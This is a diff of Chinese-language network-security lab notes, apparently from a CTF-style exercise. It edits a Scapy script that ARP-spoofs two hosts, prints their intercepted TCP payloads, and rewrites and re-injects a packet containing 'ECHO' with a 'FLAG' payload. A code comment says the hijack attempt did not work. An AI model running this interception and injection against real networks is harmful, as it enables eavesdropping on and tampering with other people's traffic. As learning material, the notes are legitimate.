@@ -31,7 +31,7 @@ comments: true
   - [4.4 TCP三次握手](#44-tcp三次握手)
   - [4.5 发送ARP报文](#45-发送arp报文)
   - [4.6 arp欺骗](#46-arp欺骗)
-  - [4.6 tcp中间人劫持](#46-tcp中间人劫持)
+  - [4.6 tcp中间人流量监听](#46-tcp中间人流量监听)
 
 
 ## 前言<br>
@@ -482,7 +482,7 @@ ip addr add 10.0.0.2/24 dev eth0
 nc -l 31337
 ```
 
-### 4.6 tcp中间人劫持<br>
+### 4.6 tcp中间人流量监听<br>
 ```python
 from scapy.all import *
 import threading
@@ -514,21 +514,24 @@ def process_packet(packet):
 			if packet.haslayer(Raw):
 				data = packet[Raw].load
 				print(data)
+			#send(packet,iface="eth0")
 		else :
 			if ip_src == ip2 and ip_dst ==ip1:
 				#print("{ip2} to {ip1}")
 				if packet.haslayer(Raw):
-					data = packet[Raw].load
+					copy = packet.copy()
+					data = copy[Raw].load
 					print(data)
 					if b"ECHO" in data:
 						print("hit!!!!!!!!!!!!!!!!!----------------------++++++++++++++++++")
-						packet.show()
-						packet[Raw].load = b"FLAG\n"
-						del packet[IP].chksum
-						del packet[TCP].chksum
-						packet.show2()
-						sendp(packet,iface="eth0")
-
+						copy.show()
+						copy[Raw].load = b"FLAG\n"
+						del copy[IP].chksum
+						del copy[TCP].chksum
+						del copy[IP].len
+						copy.show2()
+						sendp(copy,iface="eth0") # 原本想要劫持，但是出了问题，但是发现通过send发送的报文无法被wireshark截获，然而sendp发送的被识别为不合法的报文，很怪
+			#send(packet,iface="eth0")
 arp_thread=threading.Thread(target=arp_spoof)
 arp_thread.start()
 
